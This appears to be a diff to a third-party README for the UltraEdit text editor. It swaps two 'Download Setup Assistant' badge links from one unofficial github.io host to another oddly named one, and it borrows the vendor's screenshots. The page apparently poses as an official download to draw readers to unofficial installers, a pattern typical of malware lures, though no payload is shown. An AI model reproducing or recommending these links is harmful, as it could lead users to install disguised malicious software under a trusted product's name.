@@ -1,6 +1,6 @@
 # UltraEdit 
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://ultraedit-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://asdeennerhorse.github.io/mogus/UltraEdit)
 
 ---
 
@@ -29,7 +29,7 @@
 ![UltraEdit Screenshot 1](https://www.ultraedit.com/wp-content/uploads/2022/10/image5.jpg)  
 ![UltraEdit Screenshot 2](https://www.ultraedit.com/wp-content/uploads/2022/10/image2.jpg)  
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://ultraedit-download.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://asdeennerhorse.github.io/mogus/UltraEdit)
 
 ---
 
